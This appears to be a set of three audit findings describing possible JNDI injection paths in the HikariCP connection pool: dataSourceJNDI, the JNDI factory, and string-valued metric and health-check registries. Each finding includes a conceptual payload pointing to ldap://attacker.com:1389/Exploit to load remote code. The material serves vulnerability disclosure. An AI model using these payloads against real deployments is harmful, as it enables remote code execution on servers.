Title: JNDI Injection via dataSourceJNDI in PoolBase
Analysis:
HikariCP supports JNDI lookups for configured `dataSourceJNDI` strings via the `InitialContext.lookup` API. If an attacker can control the connection configuration properties or the JNDI name used in `dataSourceJNDI` (e.g. from an untrusted configuration file or injection), they can point the pool to an arbitrary attacker-controlled JNDI server (such as an LDAP or RMI endpoint), leading to Remote Code Execution (RCE) via JNDI Injection.

Conceptual Exploit:
A configuration containing the properties:
```properties
dataSourceJNDI=ldap://attacker.com:1389/Exploit
```
When `PoolBase` initializes the data source via `initializeDataSource()`, it performs a JNDI lookup:
`ic.lookup("ldap://attacker.com:1389/Exploit")`, resulting in RCE.

Title: JNDI Injection via HikariJNDIFactory lookupJndiDataSource
Analysis:
HikariJNDIFactory is used to produce HikariDataSource instances via JNDI. When a JNDI Reference is provided, it reads its attributes to initialize properties. If the properties contain `dataSourceJNDI`, it executes a JNDI lookup on the provided name: `context.lookup(jndiName)` or `new InitialContext().lookup(jndiName)`. If an attacker can control this JNDI Reference attributes (e.g. through JNDI injection or configuration injection), they can trigger an arbitrary lookup leading to JNDI Injection / Remote Code Execution.

Conceptual Exploit Payload:
A JNDI reference containing the attribute `dataSourceJNDI` with the value `ldap://attacker.com:1389/Exploit` is passed to the factory. When `HikariJNDIFactory.getObjectInstance` is invoked, it calls `createDataSource` which triggers a lookup on `ldap://attacker.com:1389/Exploit`.

Title: JNDI Injection via Dynamic Properties in HikariConfig
Analysis:
In `HikariConfig.java`, JNDI lookups are performed dynamically when getting an object or performing a JNDI lookup via `InitialContext.lookup` if the input is a String. Specifically, properties passed to HikariConfig such as `metricRegistry` or `healthCheckRegistry` can be Strings representing JNDI names, which are resolved using `InitialContext.lookup(jndiName)` without any sanitization or validation. If an attacker can inject custom configuration properties (e.g. from an untrusted configuration file), they can configure these properties to trigger a JNDI Injection / Remote Code Execution.

Conceptual Exploit Payload:
A configuration containing the property:
```properties
metricRegistry=ldap://attacker.com:1389/Exploit
```
When `HikariConfig.setMetricRegistry` is called with this value, it executes `getObjectOrPerformJndiLookup("ldap://attacker.com:1389/Exploit")`, triggering `initCtx.lookup("ldap://attacker.com:1389/Exploit")`.
